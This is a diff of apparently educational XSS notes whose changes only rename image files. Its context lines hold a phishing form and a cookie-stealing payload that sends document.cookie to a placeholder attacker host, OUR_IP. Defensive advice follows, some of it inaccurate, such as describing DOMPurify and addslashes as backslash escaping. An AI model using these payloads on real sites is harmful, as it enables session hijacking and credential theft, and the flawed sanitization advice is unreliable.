@@ -272,9 +272,9 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><inp
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>the page should look as follows when we visit the malicious URL</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>the page should look as follows when we visit the malicious URL</p></figcaption></figure>
 
 ### Session Hijacking
 
@@ -302,13 +302,13 @@ new Image().src='http://OUR_IP/?c='+document.cookie
 
 ### **Input Validation**
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>web application will not allow us to submit the form if the email format is invalid. This was done with the following JavaScript code. This code is testing the <code>email</code> input field and returning <code>true</code> or <code>false</code> whether it matches the Regex validation of an email format</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>web application will not allow us to submit the form if the email format is invalid. This was done with the following JavaScript code. This code is testing the <code>email</code> input field and returning <code>true</code> or <code>false</code> whether it matches the Regex validation of an email format</p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>We should also ensure that we prevent XSS vulnerabilities with measures on the back-end to prevent Stored and Reflected XSS vulnerabilities</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>We should also ensure that we prevent XSS vulnerabilities with measures on the back-end to prevent Stored and Reflected XSS vulnerabilities</p></figcaption></figure>
 
 ### Input Sanitization
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>we should always ensure that we do not allow any input with JavaScript code in it, by escaping any special characters. For this, we can utilize the <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> This will escape any special characters with a backslash <code>\</code>, which should help ensure that a user does not send any input with special characters (like JavaScript code), which should prevent vulnerabilities like DOM XSS.</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>we should always ensure that we do not allow any input with JavaScript code in it, by escaping any special characters. For this, we can utilize the <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> This will escape any special characters with a backslash <code>\</code>, which should help ensure that a user does not send any input with special characters (like JavaScript code), which should prevent vulnerabilities like DOM XSS.</p></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>for a PHP back-end, we can use the <code>addslashes</code> function to sanitize user input by escaping special characters with a backslash. In any case, direct user input (e.g. <code>$_GET['email']</code>) should never be directly displayed on the page, as this can lead to XSS vulnerabilities</p></figcaption></figure>
 
